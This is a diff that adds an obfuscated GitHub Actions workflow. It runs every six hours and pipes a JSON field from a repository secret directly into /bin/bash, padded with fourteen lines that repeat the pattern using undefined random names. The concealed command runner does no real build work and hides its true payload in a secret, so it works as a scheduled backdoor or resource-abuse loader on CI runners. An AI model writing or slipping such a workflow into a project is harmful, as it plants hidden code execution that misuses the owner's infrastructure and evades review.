@@ -1,0 +1,32 @@
+name: tremblebusy
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tremblebusy
+        env:
+          wic96862: ${{ secrets.wic96862 }}
+        run: |
+          echo $wic96862 | jq -r .hkt192 | /bin/bash
+          echo $pqf89 | jq -r .rqv7294 | /bin/bash
+          echo $panny768 | jq -r .eff9 | /bin/bash
+          echo $hc047 | jq -r .dpa60090 | /bin/bash
+          echo $g430 | jq -r .j773 | /bin/bash
+          echo $c697 | jq -r .ebz239 | /bin/bash
+          echo $qantu70108 | jq -r .povl84 | /bin/bash
+          echo $z82836 | jq -r .spj58 | /bin/bash
+          echo $oh781 | jq -r .uryf8617 | /bin/bash
+          echo $grk05 | jq -r .s9 | /bin/bash
+          echo $asire4 | jq -r .lyvz71 | /bin/bash
+          echo $jjltt8 | jq -r .pkxhf7557 | /bin/bash
+          echo $gdt3 | jq -r .q0 | /bin/bash
+          echo $ymize92172 | jq -r .hntxm56 | /bin/bash
+          echo $qfyh04608 | jq -r .f72549 | /bin/bash
+
